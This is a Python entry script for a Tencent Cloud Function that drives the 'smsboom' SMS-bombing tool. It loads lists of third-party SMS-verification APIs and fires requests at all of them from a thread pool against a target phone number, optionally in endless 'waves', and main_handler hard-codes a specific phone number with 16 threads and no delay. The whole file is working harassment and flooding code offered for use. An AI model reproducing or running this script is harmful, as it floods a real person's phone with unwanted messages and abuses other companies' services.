# -*- coding: utf8 -*-
# 腾讯云函数执行入口

from smsboom import *

logger.remove()
logger.remove()

def run(thread: int, phone: Union[str, tuple], interval: int, super: bool = False):
    """传入线程数和手机号启动轰炸,支持多手机号"""
    logger.info(f"循环模式:{super},手机号:{phone},线程数:{thread},循环间隔:{interval}")

    with ThreadPoolExecutor(max_workers=thread) as pool:
        try:
            _api = load_json()
            _api_get = load_getapi()
        except ValueError:
            logger.error("读取接口出错!正在重新下载接口数据!....")
            update()
            sys.exit(1)
        i = 0
        if super:
            while True:
                i += 1
                logger.success(f"第{i}波轰炸开始！")
                for api in _api:
                    pool.submit(req, api, phone)
                for api_get in _api_get:
                    pool.submit(req, api_get, phone)
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)
        else:
            for api in _api:
                pool.submit(req, api, phone)
            for api_get in _api_get:
                pool.submit(req, api_get, phone)



def main_handler(event, context):
    run(phone="19820294268", thread=16, interval=0)
